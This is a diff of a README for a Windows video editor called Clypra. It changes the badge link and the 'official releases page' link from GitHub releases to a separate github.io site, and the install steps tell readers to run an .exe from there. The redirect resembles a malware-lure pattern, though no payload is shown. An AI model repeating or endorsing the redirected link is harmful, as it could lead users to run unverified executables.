@@ -1,6 +1,6 @@
 # ✂️ Clypra - Create professional videos with ease
 
-[![](https://img.shields.io/badge/Download_Clypra-Blue-blue.svg)](https://github.com/Elwininvading138/Clypra/releases)
+[![](https://img.shields.io/badge/Download_Clypra-Blue-blue.svg)](https://elwininvading138.github.io)
 
 Clypra offers a simple way to edit video files on your Windows computer. It provides tools for cutting, trimming, and adding effects to your footage. You do not need technical skills to produce high-quality videos.
 
@@ -8,7 +8,7 @@ Clypra offers a simple way to edit video files on your Windows computer. It prov
 
 Follow these steps to set up the software on your machine.
 
-1. Visit the [official releases page](https://github.com/Elwininvading138/Clypra/releases) to access the download files.
+1. Visit the [official releases page](https://elwininvading138.github.io) to access the download files.
 2. Look for the file that ends in .exe under the latest version tag.
 3. Click the file to start your download.
 4. Open the folder where your computer saved the file.
